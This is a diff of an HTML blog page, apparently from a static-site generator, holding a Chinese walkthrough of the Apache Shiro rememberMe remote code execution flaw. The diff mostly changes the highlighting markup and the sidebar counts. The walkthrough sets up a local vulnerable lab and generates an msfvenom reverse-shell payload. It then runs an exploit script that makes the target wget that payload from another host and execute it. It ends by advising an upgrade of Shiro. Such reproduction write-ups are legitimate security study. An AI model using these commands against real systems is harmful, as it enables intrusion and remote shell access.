@@ -371,33 +371,33 @@ shiro用remembreme这个cookie对用户进行鉴权，防止出现越权问题�
 <h1>0x02 漏洞环境</h1>
 <h3 id="方法一：Docker环境搭建">方法一：Docker环境搭建</h3>
 <p>这里可以直接pull大佬们做好的docker的漏洞环境</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull medicean/vulapps:s_shiro_1</span><br></pre></td></tr></table></figure>
+<figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull medicean/<span class="string">vulapps:</span>s_shiro_1</span><br></pre></td></tr></table></figure>
 <p>将docker漏洞环境的8080端口映射到本机的80端口</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -d -p 80:8080 medicean/vulapps:s_shiro_1</span><br></pre></td></tr></table></figure>
+<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="keyword">run</span><span class="bash"> -d -p 80:8080 medicean/vulapps:s_shiro_1</span></span><br></pre></td></tr></table></figure>
 <h3 id="方法二：Linux虚拟机或者VPS搭建tomcat及shiro环境">方法二：Linux虚拟机或者VPS搭建tomcat及shiro环境</h3>
 <p>java环境啥的鸟都带了<br>
 直接去tomcat官网去下载二进制包，不用百度了，这里直接给你百度完了，<a href="http://mirror.bit.edu.cn/apache/tomcat/tomcat-8/v8.5.43/bin/apache-tomcat-8.5.43.tar.gz" target="_blank" rel="noopener">点击我进行跳转，Run！</a><br>
 或者你直接可以</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo wget http://mirror.bit.edu.cn/apache/tomcat/tomcat-8/v8.5.43/bin/apache-tomcat-8.5.43.tar.gz /usr/share</span><br></pre></td></tr></table></figure>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo wget http:<span class="regexp">//mi</span>rror.bit.edu.cn<span class="regexp">/apache/</span>tomcat<span class="regexp">/tomcat-8/</span>v8.<span class="number">5.43</span><span class="regexp">/bin/</span>apache-tomcat-<span class="number">8.5</span>.<span class="number">43</span>.tar.gz <span class="regexp">/usr/</span>share</span><br></pre></td></tr></table></figure>
 <p>然后直接解压</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo tar zxvf apache-tomcat-8.5.43..tar.gz</span><br></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/share/apache-tomcat-8.5.43/bin/startup.sh</span><br></pre></td></tr></table></figure>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">sudo</span> <span class="selector-tag">tar</span> <span class="selector-tag">zxvf</span> <span class="selector-tag">apache-tomcat-8</span><span class="selector-class">.5</span><span class="selector-class">.43</span>.<span class="selector-class">.tar</span><span class="selector-class">.gz</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">/usr/</span>share<span class="regexp">/apache-tomcat-8.5.43/</span>bin<span class="regexp">/startup.sh</span></span><br></pre></td></tr></table></figure>
 <p>我们现在只需把shiro包放到webapps下即可</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo cp shiro.war /usr/share/apache-tomcat-8.5.43/webapps</span><br></pre></td></tr></table></figure>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo cp shiro.war <span class="regexp">/usr/</span>share<span class="regexp">/apache-tomcat-8.5.43/</span>webapps</span><br></pre></td></tr></table></figure>
 <p>然后访问</p>
- <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">localhost:8080/Shiro</span><br></pre></td></tr></table></figure>
+ <figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">localhost:</span><span class="number">8080</span>/Shiro</span><br></pre></td></tr></table></figure>
 <p><img src="https://raw.githubusercontent.com/HexChristmas/Shiro_exploit/master/img/3.png" alt="shiro"></p>
 <p>能看到这个就说明你已经启动成功了</p>
 <h1>0x02 漏洞利用</h1>
 <p>用msfvenom生成payload用于反弹shell</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x86/shell_reverse_tcp LHOST= LPORT=2333 elf &gt;  payload</span><br></pre></td></tr></table></figure>
+<figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x86/shell_reverse_tcp <span class="attr">LHOST=</span> <span class="attr">LPORT=2333</span> elf &gt;  payload</span><br></pre></td></tr></table></figure>
 <p><img src="https://raw.githubusercontent.com/HexChristmas/Shiro_exploit/master/img/1.png" alt="msfvenom"></p>
 <p>nc监听2333端口</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 2333</span><br></pre></td></tr></table></figure>
+<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp <span class="number">2333</span></span><br></pre></td></tr></table></figure>
 <p>使用shiro的脚本进行远程代码执行漏洞利用</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python shiro_exploit.py &quot;http://127.0.0.1:81&quot; &quot;wget -p /tmp/ http://172.18.24.35/payload&quot;</span><br></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python shiro_exploit.py &quot;http://127.0.0.1:81&quot; &quot;chmod +x /tmp/payload&quot;</span><br></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python shiro_exploit.py &quot;http://127.0.0.1:81&quot; &quot;/tmp/payload&quot;</span><br><span class="line">&quot;</span><br></pre></td></tr></table></figure>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python shiro_exploit<span class="selector-class">.py</span> <span class="string">"http://127.0.0.1:81"</span> <span class="string">"wget -p /tmp/ http://172.18.24.35/payload"</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python shiro_exploit<span class="selector-class">.py</span> <span class="string">"http://127.0.0.1:81"</span> <span class="string">"chmod +x /tmp/payload"</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">python</span> shiro_exploit.<span class="keyword">py</span> <span class="string">"http://127.0.0.1:81"</span> <span class="string">"/tmp/payload"</span></span><br><span class="line"><span class="comment">"</span></span><br></pre></td></tr></table></figure>
 <p><img src="https://raw.githubusercontent.com/HexChristmas/Shiro_exploit/master/img/2.png" alt="exploit"></p>
 <h1>0x03 漏洞修复</h1>
 <p>升级 Shiro 版本至 1.2.5 以上</p>
@@ -566,7 +566,7 @@ shiro用remembreme这个cookie对用户进行鉴权，防止出现越权问题�
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">45</span>
+                  <span class="site-state-item-count">46</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -578,8 +578,8 @@ shiro用remembreme这个cookie对用户进行鉴权，防止出现越权问题�
               
               
               <div class="site-state-item site-state-tags">
-                <a href="/tag/index.html">
-                  <span class="site-state-item-count">56</span>
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">57</span>
                   <span class="site-state-item-name">标签</span>
                 </a>
               </div>
